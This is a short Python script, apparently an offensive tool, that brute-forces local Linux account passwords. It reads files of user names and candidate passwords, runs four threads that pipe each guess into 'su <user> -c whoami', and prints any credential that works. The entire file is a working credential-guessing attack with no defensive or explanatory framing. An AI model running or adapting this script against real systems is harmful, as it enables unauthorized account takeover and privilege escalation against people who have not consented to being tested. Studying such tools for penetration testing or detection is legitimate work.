from subprocess import PIPE,Popen,DEVNULL
from sys import argv
import queue
import threading

finishedFlag=0

def check_file(possible_path: str)-> list[bytes]:
    try:
        return list(map(lambda x: x[:-1], open(possible_path, 'rb').readlines()))
    except FileNotFoundError:
        return [bytes(possible_path,'utf-8')]

class bruterThread(threading.Thread):
    def __init__(self, threadID: int, targetUser: int, passwdq):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.tuser = targetUser
        self.passwdq = passwdq

    def run(self):
        sudo_bruteforce(self.threadID,self.tuser, self.passwdq)

def sudo_bruteforce(id: int, user: str, passwdq):
    global finishedFlag

    while not finishedFlag and not passwdq.empty():
        password=passwdq.get()
        
        print(f"thread# {id} testing:{user} with {password}")
        su_test = Popen(
            ["su", user,"-c","whoami"],
            stdin=PIPE,
            stdout=PIPE,
            stderr=DEVNULL
        )
        stdout_data = su_test.communicate(input=password)[0]
        if user in stdout_data:
            print(f"[+] Success with {user.decode('utf-8')}:{password.decode('utf-8')}")
            finishedFlag = 1

def main():
    users = check_file(argv[1])
    global finishedFlag
    passwords = check_file(argv[2])
    passwordQueue = queue.Queue(len(passwords))
    threads=[]

    for user in users:
        #Regenerate password work queue for each user
        for password in passwords:
            passwordQueue.put(password)
        
        #Add more threads?
        for i in range(1,5,1):
            threadx = bruterThread(i, user, passwordQueue)
            print(f"starting thread# {i}")
            threadx.start()
            threads.append(threadx)

        for t in threads:
            t.join()
        
        passwordQueue.queue.clear()
        finishedFlag = 0
        print(f"[+] finished testing: {user}")

if __name__ == "__main__":
    main()